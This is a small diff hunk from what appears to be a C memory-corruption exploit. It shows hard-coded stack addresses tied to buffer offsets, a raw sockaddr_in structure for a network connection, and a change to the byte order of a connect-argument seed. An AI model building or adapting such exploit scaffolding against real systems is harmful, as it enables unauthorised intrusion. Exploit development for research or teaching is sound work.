@@ -64,7 +64,7 @@ int main(void)
   char sockaddr_in[] = "\x01\x02\x39\x30\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01";
   char sockaddr_in_addr[] = "\x28\x68\xbf\xbf"; // buf + 267
 
-  char con_arg_16_seed[] = "\x01\x01\x01\xf0";
+  char con_arg_16_seed[] = "\xf0\x01\x01\x01";
   char con_arg_16_addr[] = "\x9c\x68\xbf\xbf"; // bufr + 383
 
   int i;
